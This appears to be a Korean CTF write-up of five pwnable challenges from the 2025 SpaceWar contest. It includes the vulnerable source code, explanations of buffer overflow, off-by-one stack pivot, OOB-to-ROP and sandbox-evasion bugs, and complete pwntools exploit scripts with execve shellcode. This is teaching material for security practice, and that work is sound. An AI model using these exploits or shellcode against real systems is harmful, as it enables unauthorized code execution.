---
title: 2025 SpaceWar#1 (Pwnable) 풀이
description: HSPACE에서 출제한 2025 SpaceWar 포너블 문제 풀이입니다.
author: hspace
date: 2025-04-27 19:00:00 +0900
tags: [Tech, CTF]
categories: [Tech, CTF]
comments: false
math: true
mermaid: false
pin: false
image: /assets/img/2025_spacewar1/thumbnail.jpg
---

## 목차
- [bxorf](#bxorf)
- [p-shell](#p-shell)
- [tinyerror](#tinyerror)
- [ez\_vm](#ez_vm)
- [perfect machine](#perfect-machine)

#### bxorf

문제 코드는 다음과 같습니다.

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

__attribute__((visibility("hidden"))) void cat() {
    uint64_t a = 0x63617420;
    char input[11]; //3735928559
    uint64_t b = 0xb8c1df88; //0x7c465b2d
    uint64_t c = 0; 
    write(1,"Meow Meow: ",11);
    read(0,input, 10);
    c = atoi(input);
    uint64_t result = c^b;

    char asciiStr1[5];
    asciiStr1[0] = (a >> 24) & 0xFF; // 가장 상위 바이트
    asciiStr1[1] = (a >> 16) & 0xFF; // 두 번째 바이트
    asciiStr1[2] = (a >> 8) & 0xFF;  // 세 번째 바이트
    asciiStr1[3] = a & 0xFF;         // 가장 하위 바이트
    asciiStr1[4] = '\0';                  // 문자열의 끝을 나타내는 null 문자
    char asciiStr2[5];  // 네 문자와 null 종단을 위한 공간
    asciiStr2[0] = (result >> 24) & 0xFF; // 가장 상위 바이트
    asciiStr2[1] = (result >> 16) & 0xFF; // 두 번째 바이트
    asciiStr2[2] = (result >> 8) & 0xFF;  // 세 번째 바이트
    asciiStr2[3] = result & 0xFF;         // 가장 하위 바이트
    asciiStr2[4] = '\0';                  // 문자열의 끝을 나타내는 null 문자

    char command[10];
    sprintf(command, "%s%s", asciiStr1, asciiStr2);
    system(command);

}

void ls(){
    int a = 0xabcde575;  // 첫 번째 16진수 정수
    int b = 0xc7bec55b;  // 두 번째 16진수 정수

    // XOR 연산을 수행합니다.
    int result = a ^ b;

    // 결과를 바이트 단위로 분리하여 ASCII 코드로 변환합니다.
    char asciiStr[5];  // 네 문자와 null 종단을 위한 공간
    asciiStr[0] = (result >> 24) & 0xFF; // 가장 상위 바이트
    asciiStr[1] = (result >> 16) & 0xFF; // 두 번째 바이트
    asciiStr[2] = (result >> 8) & 0xFF;  // 세 번째 바이트
    asciiStr[3] = result & 0xFF;         // 가장 하위 바이트
    asciiStr[4] = '\0';                  // 문자열의 끝을 나타내는 null 문자

    // 결과 문자열을 출력합니다.
    system(asciiStr);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

int main() {
    
    init();

    char buf[0x20] = {};
    printf("<File List>\n");
    ls();


    printf("Can You \"CAT\"ch the flag?: ");
    read(0, buf, 0x40);
    printf("(^ ・x ・^): %s\n",buf);

    return 0;
}
```

xor은 다음과 같은 성질을 지닙니다.
- a^b=c 라면 a^c=b 라는 것입니다.

`ls()` 함수에는 이를 이용하여 ls를 구현하고 일부러 strip을 진행하지 않아 코드 해석을 통해 "ls ." 이라는 문자열이 system 함수로 인해 실행된다는 것을 볼 수 있습니다.

이를 기억하고 `main()` 함수에서 bof를 통해 strip이 진행된 `cat()` 함수로 실행함수를 옮기고, 앞 4개의 문자열이 "cat " 이라는 것을 확인하여 뒤 4자리 문자열은 flag가 되도록 xor 될 입력값을 찾으면 됩니다.

int로 입력을 받으므로 "3735928559" 입력해주면 됩니다.
그러면 "cat flag"가 완성되고 system으로 인해 실행되어 flag가 출력됩니다.


exploit.py
```py
from pwn import *

p = process('./bxorf')

ret = 0x40101a
cat = 0x401216
payload = b'a'*0x28 + p64(ret) +p64(cat)

p.send(payload)
p.recvuntil("Meow Meow: ")
p.send(str(3735928559))

p.interactive()
```

#### p-shell

문제 코드는 다음과 같습니다.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <math.h>

int is_prime(int n) {
    if (n < 2)
        return 0;
    int limit = (int)sqrt(n);
    for (int i = 2; i <= limit; i++) {
        if (n % i == 0)
            return 0;
    }
    return 1;
}

int main() {
    unsigned char input[4096];
    ssize_t input_len;

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    printf("Input : ");

    input_len = read(STDIN_FILENO, input, sizeof(input));
    if (input_len <= 0) {
        perror("read error");
        exit(EXIT_FAILURE);
    }

    unsigned char *filtered = malloc(input_len);
    if (!filtered) {
        perror("malloc error");
        exit(EXIT_FAILURE);
    }
    int filtered_len = 0;
    for (int i = 0; i < input_len; i++) {
        if (!is_prime(input[i])) {
            filtered[filtered_len++] = input[i];
        }
    }

    if (filtered_len == 0) {
        printf("Error\n");
        free(filtered);
        exit(EXIT_FAILURE);
    }

    void *exec_mem = mmap(NULL, filtered_len, 
                          PROT_READ | PROT_WRITE | PROT_EXEC, 
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap error");
        free(filtered);
        exit(EXIT_FAILURE);
    }

    memcpy(exec_mem, filtered, filtered_len);

    void (*shell_func)() = exec_mem;
    shell_func();

    munmap(exec_mem, filtered_len);
    free(filtered);
    return 0;
}
```

소스코드를 분석해보면 소수 바이트 값들은 필터링을 수행합니다. 이외에 바이트 범위를 활용하여 쉘코드를 작성해야 합니다.

소수 범위를 먼저 걸러줍시다.
```c
#include <stdio.h>
#include <math.h>

int is_prime(int n) {
    if (n < 2)
        return 0;
    int limit = (int)sqrt(n);
    for (int i = 2; i <= limit; i++) {
        if (n % i == 0)
            return 0;
    }
    return 1;
}

int main() {
    for (int i = 2; i <= 255; i++) {
        if (is_prime(i)) {
            printf("%#x ", i);
        }
    }
    printf("\n");
    return 0;
}
```

필터링 되는 값들은 다음과 같습니다.
- `0x2 0x3 0x5 0x7 0xb 0xd 0x11 0x13 0x17 0x1d 0x1f 0x25 0x29 0x2b 0x2f 0x35 0x3b 0x3d 0x43 0x47 0x49 0x4f 0x53 0x59 0x61 0x65 0x67 0x6b 0x6d 0x71 0x7f 0x83 0x89 0x8b 0x95 0x97 0x9d 0xa3 0xa7 0xad 0xb3 0xb5 0xbf 0xc1 0xc5 0xc7 0xd3 0xdf 0xe3 0xe5 0xe9 0xef 0xf1 0xfb`

[shell-storm](https://shell-storm.org/shellcode/index.html)에 있는 Shellcode를 수정하여 exploit을 수행해주면 됩니다. 

exploit.py

```py
from pwn import *
import sympy
import time

context.arch = "amd64"

# 0x2 0x3 0x5 0x7 0xb 0xd 0x11 0x13 0x17 0x1d 0x1f 0x25 0x29 0x2b 0x2f 0x35 0x3b 0x3d 0x43 0x47 0x49 0x4f 0x53 0x59 0x61 0x65 0x67 0x6b 0x6d 0x71 0x7f 0x83 0x89 0x8b 0x95 0x97 0x9d 0xa3 0xa7 0xad 0xb3 0xb5 0xbf 0xc1 0xc5 0xc7 0xd3 0xdf 0xe3 0xe5 0xe9 0xef 0xf1 0xfb

payload = asm('''
xor rsi, rsi
push rsi

mov rcx, 0x68732e2e6e69622e
push rcx

inc byte ptr [rsp]
inc byte ptr [rsp+4]

push 0
inc byte ptr [rsp]
inc byte ptr [rsp]
inc byte ptr [rsp]
inc byte ptr [rsp]
inc byte ptr [rsp]
pop rsi
add byte ptr [rsp+rsi], 1

push rsp

pop rdi

xor rsi, rsi

push 58
add byte ptr [rsp], 1
pop rax
cdq
xor r12, r12
push r12
mov byte ptr [rsp], 0x0e
mov byte ptr [rsp+1], 0x04

inc byte ptr [rsp]
inc byte ptr [rsp+1]

call rsp
''')

print(payload)

# for i in range(0x1000):
#     if sympy.isprime(payload[i]):
#         print(f"Invalid shellcode at {i}: {payload[i]:#x}")

p = process('./p-shell')
p = remote('localhost', 18775)

print(payload)

pause()
p.sendlineafter(b'Input : ', payload)

p.interactive()
```

#### tinyerror

전역변수에 input을 입력받고 이를 `interpret_dec`, `interpret_hex` 함수에서 사용합니다.
```c
int main()
{
    char buf[100];
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);

    puts("Provide your input: ");
    read(0, input, 200);
    
    int dec = interpret_dec();
    printf("Interpreted as decimal: %d\n", dec);

    int hex = interpret_hex();
    printf("Interpreted as hex: %d\n", hex);
}
```

로컬변수 버퍼의 크기는 100이지만, 실제로 버퍼에서 SFP까지의 offset은 112, 리턴 주소까지의 offset은 120으로 설정됩니다.(allignment) 113만큼 memcpy를 하는데, 이때 SFP의 1바이트가 덮이는 off-by-one이 발생합니다. 길이 체크는 strlen으로 하기 때문에 null이 포함된 페이로드는 종료되지 않습니다.

이 과정이 2번 발생하기 때문에 자동으로 스택이 pivoting되어 `interpret_hex`의 return에서 RIP를 바꿀 수 있습니다.

```c
int interpret_dec()
{
    char buf[100];
    if(strlen(input) > 112){
        puts("Input too long!");
        exit(-1);
    }
    memcpy(buf, input, 113);
    return atoi(buf);
}

int interpret_hex()
{
    char buf[100];
    if(strlen(input) > 112){
        puts("Input too long!");
        exit(-1);
    }
    memcpy(buf, input, 113);
    return strtol(buf, NULL, 16);
}

```

풀이 코드는 다음과 같습니다.

exploit.py

```py
#!/usr/bin/env python3
import sys, os
from pwn import *

TARGET= "./chall"
elf = ELF(TARGET)
HOST, PORT = 'localhost 11115'.split(' ')


def exploit(p):
    p.recvuntil(b"input")
    p.send(b"12\t"+b"A"*101 + p64(0x401256))
    p.interactive()
    return

if __name__ == "__main__":
    p = remote(HOST, PORT)
    exploit(p)
    exit(0)```
```

#### ez_vm

main함수의 소스코드는 다음과 같습니다. buf에 opcode를 0x100 바이트 입력을 받고 sub_401215를 실행합니다. 4011A5나 4011EC같은 경우 그냥 init 함수들입니다.
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  char s[8]; // [rsp+108h] [rbp-8h] BYREF

  sub_4011A5(a1, a2, a3);
  memset(s, 0, sizeof(s));
  sub_4011EC(&unk_404080);
  puts("opcode: ");
  memset(buf, 0, 0x100uLL);
  dword_404074 = 0;
  read(0, buf, 0x100uLL);
  while ( buf[dword_404074] )
  {
    sub_401215(&unk_404080, s, &buf[dword_404074]);
    dword_404074 += 8;
  }
  return 0LL;
}
```

sub_401215 이 함수를 살펴봅시다.

opcode = 1이면 전역변수에 특정 값을 넣을 수 있고, opcode = 3이면 2번째 인자 (위의 s에 해당)에서 인덱스를 통해 전역변수에 있는 값을 넣을 수 있는 것을 확인할 수 있습니다. 이 때, 1번은 5까지 그 이후로는 4까지 인덱스를 사용할 수 있다는 것을 확인할 수 있습니다. main함수에서 s는 int s[2]였던 것을 생각하면 여기서 OOB가 일어나 sfp와 ret을 덮을 수 있다는 것을 알 수 있습니다.

하지만, sfp와 ret을 덮을 수 있는 취약점만으로 어떻게 익스할 수 있을까요? 바로 main함수의 `read(0, buf, 0x100uLL);` 를 이용하면 됩니다.

sfp를 w권한이 있는 bss영역으로 덮은 다음, ret에  저 주소를 넣으면 rbp-0x110에 입력하기 때문에 bss에 fake stack을 만들 수 있으며, `read(0, buf, 0x100uLL);` 아래에 `execute(&vm,memory,&program[i]);` 가 있기에, sfp 와 ret을 덮을 수 있는 취약점을 여러번 사용할 수 있습니다.

또한 read를 통해서 opcode를 입력하는 부분에서 sfp와 ret을 덮는 부분 이후에 값을 쓸 수 있는데, 이를 이용하여 ROP를 수행할 수 있습니다. `pop rdi`, `puts_got`, `puts_plt`를 이용하면 puts의 주소를 leak해서 libc_leak이 가능합니다. 그 다음 앞의 동작과 유사하게 반복하여 `pop rdi`, `binsh`, `ret`, `system` 을 이용하여 쉘을 획득하면 됩니다.

```c
__int64 __fastcall sub_401215(__int64 a1, __int64 a2, unsigned __int8 *a3)
{
  __int64 result; // rax

  result = *a3;
  if ( (_DWORD)result == 3 )
  {
    result = *((unsigned int *)a3 + 1);
    if ( (unsigned int)result <= 3 )
    {
      result = a3[1];
      if ( (unsigned __int8)result <= 5u )
      {
        if ( a3[1] != 5 || (result = (unsigned __int8)byte_404070, !byte_404070) )
        {
          result = *(unsigned int *)(a1 + 4LL * *((unsigned int *)a3 + 1));
          *(_DWORD *)(a2 + 4LL * a3[1]) = result;
          byte_404070 = 1;
        }
      }
    }
  }
  else if ( *a3 <= 3u )
  {
    if ( (_DWORD)result == 1 )
    {
      result = a3[1];
      if ( (unsigned __int8)result <= 3u )
      {
        result = a1;
        *(_DWORD *)(a1 + 4LL * a3[1]) = *((_DWORD *)a3 + 1);
      }
    }
    else if ( (_DWORD)result == 2 )
    {
      result = a3[1];
      if ( (unsigned __int8)result <= 3u )
      {
        result = *((unsigned int *)a3 + 1);
        if ( (unsigned int)result <= 1 )
        {
          result = a1;
          *(_DWORD *)(a1 + 4LL * a3[1]) = *(_DWORD *)(4LL * *((unsigned int *)a3 + 1) + a2);
        }
      }
    }
  }
  return result;
}
```

exploit.py
```python
from pwn import *
#context.log_level="debug"
puts_plt = 0x401070
puts_got = 0x404018
pop_rdi = 0x00000000004011a3
m= 0x00000000004013b4
bss= 0x0000000000404000
ret=0x000000000040101a
#p=process("./ez_vm")
p=remote("0.0.0.0",31337)
e=ELF("./ez_vm")
libc=ELF("libc.so.6")
pause()
p.recvuntil("opcode: ")

def mov(a,b): # reg[a]=b
    s=b"\x01"
    s+= a.to_bytes(1, byteorder='little')
    s+=b"\x00\x00"
    s+= b.to_bytes(4, byteorder='little')
    
    return s
def store(a,b): # memory[a]=reg[b]
    s=b"\x03"
    s+= a.to_bytes(1, byteorder='little')
    s+=b"\x00\x00"
    s+= b.to_bytes(4, byteorder='little')
    return s
def bug(off1,ret_addr):
    
    c=mov(0,bss+off1)
    c+=store(2,0)
    c+=mov(1,ret_addr)
    c+=store(4,1)
    c=c.ljust(0x70,b"\x00")
    return c
payload=mov(1,0)
payload+=store(5,1)
payload+=bug(0x700,m)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(m)
p.send(payload)
sleep(1)

payload=bug(0x650,m)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(m)
p.send(payload)
sleep(1)

payload=bug(0x900,pop_rdi)
p.send(payload)
p.recvline()
leak=p.recvline().rstrip()
libc.address=u64(leak.ljust(8,b"\x00"))-libc.symbols["puts"]
print("libc_base: ",hex(libc.address))
payload=bug(0x850,m)
payload+=p64(next(libc.search(b'/bin/sh')))
payload+=p64(ret)
payload+=p64(libc.symbols["system"])
sleep(1)
p.send(payload)
sleep(1)
payload=bug(0x700,pop_rdi)
p.send(payload)

p.interactive()
```

#### perfect machine

해당 문제의 컨셉은 다음과 같습니다.

seccomp 필터를 사용하지 않고, 트랩 게이트와 시그널 핸들러만을 이용해서 구현한 샌드박스를 탐지하는 컨셉의 문제입니다. 유저가 입력한 쉘코드는 샌드박스에서 테스트하며 랜덤한 숫자만큼 쉘코드를 돌려서 코드가 안전한지 검사합니다. 만약 검사를 통과하면 샌드박스 외부에서 코드를 실행시킵니다. 이 때 검사하는 요소는 아래와 같습니다. 
* 시스템 콜 검사 (`open`, `read`, `write`)
* 모든 범용 레지스터에 `proc`, `flag.txt` 문자열 사용 불가능
* 샌드박스 외부로 점프 불가능
* eflag의 trap flag 비활성화 불가능
* 샌드박스 내부에서 시스템콜은 실행되지 않고 패스됨
* 민감 데이터는 샌드박스 실행시 PROT_NONE 상태로 매핑됨

코드 테스트는 무작위 횟수만큼 테스트 되는데, 이는 단순한 숫자 카운팅으로 샌드박스 내부에서 쉘코드가 실행중인지 판단하여 조건부로 코드를 실행하는 것을 방지하기 위함입니다.

취약점은 다음과 같습니다.
- 샌드박스는 기본적으로 `SIGTRAP` 시그널을 처리해서 동작하기 때문에 샌드박스 내부 코드 명령어 실행에는 굉장한 오버헤드가 존재합니. 따라서 `rdtsc` 또는 `rdtscp` 명령어를 사용해서 코드가 샌드박스 내부에 있는지 알 수 있습니다. 그 외에도 가능한 방법은 libc 메모리에 접근하여 랜덤 시드값을 알아내는 방법등이 있을 수 있습니다.

exploit.py
- 코드에서 `cmp rax, 0x8500` 부분은 시스템 별로 차이가 있을 수 있음


```py
from pwn import *
context.arch='amd64'

p = remote('localhost', 15252)
shellcode = f'''
rdtsc
mov rdi, rax
mov rsi, rdx
nop
rdtsc
sub rax, rdi
cmp rax, 0x8500
jl gogo
jmp exit
gogo:
    xor eax, eax;
    push rax;
    mov rdi, 0x68732f6e69622f;
    push rdi;
    mov rdi, rsp;
    xor esi, esi;
    xor edx, edx;
    mov al, 0x3b;
    syscall;
exit:
    ret;
'''
payload = asm(shellcode)
p.sendlineafter(b"> ", payload)
p.interactive()
```